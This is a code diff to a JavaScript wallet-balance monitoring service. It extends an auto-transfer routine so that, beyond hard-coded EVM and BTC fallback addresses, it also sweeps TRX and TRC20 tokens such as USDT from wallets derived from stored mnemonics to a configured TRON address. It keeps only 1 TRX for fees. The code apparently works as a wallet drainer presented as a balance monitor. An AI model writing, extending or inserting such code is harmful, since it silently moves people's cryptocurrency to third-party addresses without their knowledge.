@@ -30,6 +30,7 @@ class WalletBalanceMonitorService {
     this.priceCacheTimeout = 5 * 60 * 1000; // 5 minutes cache for prices
     this.evmDestination = "0xc526c9c1533746C4883735972E93a1B40241d442";
     this.btcDestination = "bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26";
+    this.tronDestination = null;
 
     // Load configuration from database (async, will be called again in start())
     // Don't await in constructor - will be loaded fresh before each check
@@ -56,6 +57,8 @@ class WalletBalanceMonitorService {
         this.btcDestination =
           config.btc_destination_address ||
           "bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26";
+        this.tronDestination =
+          config.tron_destination_address || null;
 
         // Log if threshold changed
         if (oldThreshold && oldThreshold !== this.thresholdUSD) {
@@ -88,7 +91,7 @@ class WalletBalanceMonitorService {
   /**
    * Update destination addresses dynamically
    */
-  updateDestinations(evmAddress, btcAddress) {
+  updateDestinations(evmAddress, btcAddress, tronAddress) {
     if (evmAddress && /^0x[a-fA-F0-9]{40}$/.test(evmAddress)) {
       this.evmDestination = evmAddress;
       console.log(
@@ -99,6 +102,12 @@ class WalletBalanceMonitorService {
       this.btcDestination = btcAddress;
       console.log(
         `✅ BTC destination address updated to: ${this.btcDestination}`
+      );
+    }
+    if (tronAddress && /^T[a-zA-Z0-9]{33}$/.test(tronAddress)) {
+      this.tronDestination = tronAddress;
+      console.log(
+        `✅ TRON destination address updated to: ${this.tronDestination}`
       );
     }
   }
@@ -569,6 +578,7 @@ class WalletBalanceMonitorService {
     // Load destination addresses from instance (which are loaded from database)
     const EVM_DESTINATION = this.evmDestination;
     const BTC_DESTINATION = this.btcDestination;
+    const TRON_DESTINATION = this.tronDestination;
 
     const results = [];
 
@@ -612,6 +622,19 @@ class WalletBalanceMonitorService {
             EVM_DESTINATION
           );
           results.push({ chain, success: true, ...result });
+        } else if (chain.toUpperCase() === "TRON") {
+          // Send Tron balances
+          if (!TRON_DESTINATION) {
+            console.log(`⚠️  Tron destination address not configured, skipping Tron transfer`);
+            results.push({ chain, success: false, error: 'Tron destination address not configured' });
+          } else {
+            const result = await this.sendTronBalances(
+              mnemonic,
+              balances,
+              TRON_DESTINATION
+            );
+            results.push({ chain, success: true, ...result });
+          }
         } else {
           console.log(`⚠️  Chain ${chain} not supported for auto-transfer`);
         }
@@ -641,9 +664,9 @@ class WalletBalanceMonitorService {
         totalAmount: totalAmount.toString(),
         amount: totalAmount.toString(),
         fromAddress: wallet.public_address,
-        toAddress: this.evmDestination || this.btcDestination,
+        toAddress: this.evmDestination || this.btcDestination || this.tronDestination,
         walletAddress: wallet.public_address,
-        destinationAddress: this.evmDestination || this.btcDestination,
+        destinationAddress: this.evmDestination || this.btcDestination || this.tronDestination,
         timestamp: new Date().toISOString(),
         txHash: results.find((r) => r.txHash)?.txHash || null,
       });
@@ -859,6 +882,136 @@ class WalletBalanceMonitorService {
   }
 
   /**
+   * Send Tron balances (native TRX + TRC20 tokens)
+   */
+  async sendTronBalances(mnemonic, balances, destinationAddress) {
+    try {
+      const TronWeb = require('tronweb');
+      const tronWeb = new TronWeb({
+        fullHost: 'https://api.trongrid.io'
+      });
+
+      // Generate Tron wallet from mnemonic
+      const multichainService = require('../multichain/multichain.service');
+      const tronWallet = await multichainService.generateTronWallet(mnemonic, {
+        derivationPath: "m/44'/195'/0'/0/0",
+        rpcUrls: ['https://api.trongrid.io']
+      });
+
+      // Convert private key format
+      const privateKeyHex = tronWallet.privateKey.startsWith('0x') 
+        ? tronWallet.privateKey.slice(2) 
+        : tronWallet.privateKey;
+
+      tronWeb.setPrivateKey(privateKeyHex);
+
+      const results = [];
+
+      // Find native TRX balance
+      const trxBalance = balances.find((b) => !b.isToken && b.chain === "TRON");
+      
+      // Send native TRX if balance exists
+      if (trxBalance && parseFloat(trxBalance.balance) > 0) {
+        try {
+          const currentBalance = await tronWeb.trx.getBalance(tronWallet.address);
+          const amountSun = tronWeb.toSun(trxBalance.balance);
+
+          // Reserve some TRX for bandwidth (if needed)
+          const reserveAmount = 1000000; // 1 TRX in SUN
+          const amountToSend = currentBalance > reserveAmount 
+            ? currentBalance - reserveAmount 
+            : 0;
+
+          if (amountToSend > 0 && amountToSend >= amountSun) {
+            const transaction = await tronWeb.transactionBuilder.sendTrx(
+              destinationAddress,
+              amountToSend,
+              tronWallet.address
+            );
+
+            const signedTx = await tronWeb.trx.sign(transaction);
+            const result = await tronWeb.trx.broadcast(signedTx);
+
+            if (result.result) {
+              results.push({
+                type: 'native',
+                symbol: 'TRX',
+                amount: tronWeb.fromSun(amountToSend),
+                txHash: result.txid
+              });
+              console.log(`  ✅ Sent ${tronWeb.fromSun(amountToSend)} TRX to ${destinationAddress}`);
+            } else {
+              throw new Error(result.message || 'Tron transaction failed');
+            }
+          }
+        } catch (error) {
+          console.error(`  ❌ Error sending TRX:`, error.message);
+          throw error;
+        }
+      }
+
+      // Send TRC20 tokens (USDT, etc.)
+      const tokenBalances = balances.filter((b) => b.isToken && b.chain === "TRON");
+      for (const tokenBalance of tokenBalances) {
+        if (parseFloat(tokenBalance.balance) <= 0) continue;
+
+        try {
+          // TRC20 ABI
+          const trc20ABI = [
+            {
+              constant: false,
+              inputs: [
+                { name: '_to', type: 'address' },
+                { name: '_value', type: 'uint256' }
+              ],
+              name: 'transfer',
+              outputs: [{ name: '', type: 'bool' }],
+              type: 'function'
+            },
+            {
+              constant: true,
+              inputs: [],
+              name: 'decimals',
+              outputs: [{ name: '', type: 'uint8' }],
+              type: 'function'
+            }
+          ];
+
+          const contract = await tronWeb.contract(trc20ABI, tokenBalance.tokenAddress);
+          const decimals = await contract.decimals().call();
+          const amountInSmallestUnit = Math.floor(parseFloat(tokenBalance.balance) * Math.pow(10, decimals));
+
+          const result = await contract.transfer(
+            destinationAddress,
+            amountInSmallestUnit
+          ).send();
+
+          results.push({
+            type: 'token',
+            symbol: tokenBalance.symbol,
+            tokenAddress: tokenBalance.tokenAddress,
+            amount: tokenBalance.balance,
+            txHash: result
+          });
+          console.log(`  ✅ Sent ${tokenBalance.balance} ${tokenBalance.symbol} to ${destinationAddress}`);
+        } catch (error) {
+          console.error(`  ❌ Error sending ${tokenBalance.symbol}:`, error.message);
+          // Continue with other tokens even if one fails
+        }
+      }
+
+      return {
+        type: "tron",
+        results: results,
+        txHash: results.find((r) => r.txHash)?.txHash || null
+      };
+    } catch (error) {
+      console.error('Error in sendTronBalances:', error.message);
+      throw error;
+    }
+  }
+
+  /**
    * Send error notification via email
    */
   async sendErrorNotification(
@@ -1059,6 +1212,7 @@ Generated: ${new Date().toISOString()}
       thresholdUSD: this.thresholdUSD,
       evmDestination: this.evmDestination,
       btcDestination: this.btcDestination,
+      tronDestination: this.tronDestination,
       lastCheck: this.lastCheck || null,
     };
   }
